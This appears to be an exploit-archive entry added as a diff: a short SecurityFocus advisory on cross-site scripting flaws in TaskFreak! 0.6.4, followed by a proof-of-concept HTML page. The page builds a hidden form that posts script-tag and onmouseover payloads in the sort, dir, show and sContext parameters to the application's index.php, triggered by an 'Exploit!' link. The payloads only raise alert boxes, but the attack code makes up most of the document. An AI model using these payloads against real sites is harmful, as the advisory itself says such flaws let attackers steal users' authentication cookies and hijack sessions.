@@ -1,0 +1,31 @@
+source: http://www.securityfocus.com/bid/46350/info
+
+TaskFreak! is prone to multiple cross-site scripting vulnerabilities because the application fails to sufficiently sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+TaskFreak! 0.6.4 is vulnerable; other versions may also be affected. 
+
+<script type="text/javascript">function xss(){document.forms["zappa"].submit();}</script>  
+
+<form name="zappa" action="http://taskfreak/index.php" method="POST" id="zappa">  
+
+    <input type="hidden" name="sProject" value="0" />  
+
+        <input type="hidden" name="id" value="" />  
+
+        <input type="hidden" name="mode" value="save" />  
+
+    <input type="hidden" name="sContext" value='%22%20onmouseover%3dprompt(/_did_you_smiled_today_?/)%20' />  
+
+        <input type="hidden" name="sort" value='"><script>alert(1)</script>' />  
+
+        <input type="hidden" name="dir" value='"><script>alert(2)</script>' />  
+
+        <input type="hidden" name="show" value='"><script>alert(3)</script>' />  
+
+</form>  
+
+<a href="javascript: xss();" style="text-decoration:none">  
+
+<b><font color="red"><center><h3>Exploit!<h3></center></font></b></a>  
